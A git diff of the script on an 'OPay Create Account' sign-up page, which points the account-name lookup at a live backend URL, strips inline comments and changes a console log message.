@@ -236,9 +236,8 @@
     </div>
 
     <script>
-        // ============ YOUR BACKEND API URL ============
-        // After deploying your backend to Render, put the URL here
-        const API_URL = 'https://your-backend-api.onrender.com/api/resolve-account';
+        // ============ YOUR BACKEND API URL (UPDATED WITH YOUR LIVE BACKEND) ============
+        const API_URL = 'https://opay-backend-api.onrender.com/api/resolve-account';
         
         // ============ VIBRATION FUNCTION ============
         function vibratePhone(duration = 100, pattern = null) {
@@ -258,7 +257,7 @@
                     },
                     body: JSON.stringify({
                         account_number: accountNumber,
-                        bank_code: 'opay'  // OPay bank code
+                        bank_code: 'opay'
                     })
                 });
                 
@@ -323,13 +322,13 @@
                     currentAccountName = result.name;
                     accountNameSpan.textContent = result.name;
                     accountNameSpan.style.color = '#00B875';
-                    vibratePhone(0, [50, 50, 50]); // Success vibration pattern
+                    vibratePhone(0, [50, 50, 50]);
                     await showAlert('success', 'Verified!', `Account name: ${result.name}`, [50, 50]);
                 } else {
                     currentAccountName = '';
                     accountNameSpan.textContent = 'Account not found';
                     accountNameSpan.style.color = '#e74c3c';
-                    vibratePhone(0, [200, 100, 200]); // Error vibration pattern
+                    vibratePhone(0, [200, 100, 200]);
                     await showAlert('error', 'Not Found', result.message || 'Account number not found in OPay database', [200, 100]);
                 }
                 
@@ -405,7 +404,6 @@
                 createdAt: new Date().toISOString()
             };
             
-            // Get existing users or create new array
             const existingUsers = JSON.parse(localStorage.getItem('opayUsers') || '[]');
             existingUsers.push(userData);
             localStorage.setItem('opayUsers', JSON.stringify(existingUsers));
@@ -413,7 +411,6 @@
             
             await showAlert('success', 'Account Created!', `Welcome ${currentAccountName}!\n\nYour OPay Funder account is ready.`, [100, 50, 100, 150]);
             
-            // Redirect to login page
             setTimeout(() => {
                 window.location.href = 'login1.html';
             }, 1500);
@@ -441,7 +438,7 @@
         });
         
         console.log('✓ OPay Create Account - REAL API Ready');
-        console.log('✓ Will fetch real account names from Paystack');
+        console.log('✓ Backend URL:', API_URL);
     </script>
 </body>
 </html>
